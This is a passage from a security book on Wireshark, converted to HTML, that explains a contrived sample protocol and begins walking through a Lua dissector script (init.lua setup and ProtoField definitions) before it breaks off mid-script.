<div class="Section351" ><p class=MsoBodyText  style="margin-top:3.9000pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >ID is a random number ranging that is used to tie request and response messages together, a bit like the TCP sequence number. The Message Type field is a single byte that specifies what type of message the packet is.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4500pt;" ><a name="_bookmark647" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The following are types of messages and the corresponding number for those messages:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.6667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker437041.png" ></span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >1</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212;Request message. This denotes that the message is a request message.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.5833px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker437113.png" ></span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >2</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212;Response message. This means that the packet being sent is in response to a request message that has a matching Transaction ID.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.6000pt;margin-right:17.2500pt;margin-left:30.5000pt;" ><span style="position:absolute;z-index:1;margin-left:133.0833px;margin-top:23.6667px;width:9.0000px;height:9.0000px;" ><img width="9"  height="9"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker437244.png" ></span><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >3</span></b><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >&#8212;Reserved. Currently this message type is reserved for future use.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The Message Data field is where application-specific data is held. For our contrived example, this is just 3 bytes (24 bits) of ASCII data. The Additional Data field contains more application data, and in our example, will just be some Unicode data that is maxed out at 48 bits in total (6 bytes). You may note that this protocol description is not incredibly accurate. That is on purpose, because we will walk through dealing with issues like endianess as we write our dissector.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:8.5000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At times like this, you might want to see all the packets involved in one network &#8220;stream.&#8221; Wireshark offers this feature under the Analyze menu. You will see all packets for a particular stream or session. You use it by first selecting a packet (our TCP protocol packet in this case) in the Packet List pane. Under Analyze, choose Follow, then TCP stream.<a name="_bookmark648" ></a>&nbsp;</span><span><a href="#_bookmark649" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-8</span></u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-size:15.0000pt;" >&nbsp;</span></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >shows the Follow TCP Stream window against this sample protocol within Wireshark. When Wireshark does not recognize traffic with a dissector, what you will see is a hexdump, or the data in hexadecimal form.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section352" ><p class=MsoBodyText  style="margin-left:36.5000pt;" ><img width="685"  height="539"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker438402.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark649" ></a><span><a href="#_bookmark648" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 8-8:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Sample protocol hexdump</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >With the protocol established, we can begin building the dissector. It is assumed you have enabled Lua in Wireshark. The first step in creating a dissector is to add a </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dofile()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >entry to </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua<a name="_bookmark650" ></a></span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file was mentioned previously in this chapter, in the Setup and Tools sections.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >On my Linux machine, my </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >init.lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.3000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >file looks like this:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.9000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >localhost:~/wireshark-book$ cat /etc/wireshark/init.lua |</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >tail GUI_ENABLED = gui_enabled()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:240.4500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >DATA_DIR = datafile_path() USER_DIR = persconffile_path()</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dofile("console.lua")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--dofile("dtd_gen.lua")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:13.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dofile("~/wireshark-book/sample.lua")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Note the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >dofile</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >entry, referencing the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sample.lua</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-3.6500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >script. The</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section353" ><p class=MsoBodyText  style="margin-top:3.5500pt;margin-right:17.2500pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sample.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >script is a fully functioning dissector. The </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sample.lua </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >script, as with all scripts, is available online, linked from the W4SP Lab repo on GitHub.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.4500pt;margin-right:8.6500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >The script is fully shown below for following along. While this may look intimidating at first, we break this code down so that it is easier</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.8500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to understand.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><h3 style="margin-top:7.6500pt;" ><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" >sample.lua</span></b><b><span style="mso-spacerun:'yes';font-family:Georgia;font-weight:bold;font-size:15.0000pt;" ><o:p></o:p></span></b></h3><p class=MsoNormal  style="margin-top:12.2000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><a name="_bookmark651" ></a><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create the protocol</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >sample_proto = Proto("sample", "w4sp sample protocol")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.3500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:0.0500pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create the fields so we can match on them in the filter box local f_len_h = ProtoField.uint16("sample.len_h", "Length", base.HEX,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.2500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >nil, nil, "This is the Length")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_len_d = ProtoField.uint16("sample.len_d", "Length", base.DEC,</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >nil, nil, "This is the Length")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--transid is only a single byte so uint8</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_transid_d = ProtoField.uint8("sample.transid_d",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"Trans ID",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.DEC, nil, nil, "This is the Transaction ID")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_transid_h = ProtoField.uint8("sample.transid_h",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"Trans ID",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.HEX, nil, nil, "This is the Transaction ID")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--show both string and int</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_msgtype_s = ProtoField.string("sample.msgtype_s", "MsgType",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"This is the Message Type")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_msgtype_uh = ProtoField.uint8("sample.msgtype_uh", "MsgType",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.HEX, nil, nil, "This is the Message Type")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_msgtype_ud = ProtoField.uint8("sample.msgtype_ud", "MsgType",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >base.DEC, nil, nil, "This is the Message Type")</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >--create the data</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.0000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >fields</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:15.1500pt;text-indent:-7.2000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >local f_msgdata = ProtoField.string("sample.msgdata",</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-2.7500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >"MsgData", "This is Message</span><span style="mso-spacerun:'yes';font-family:'Courier 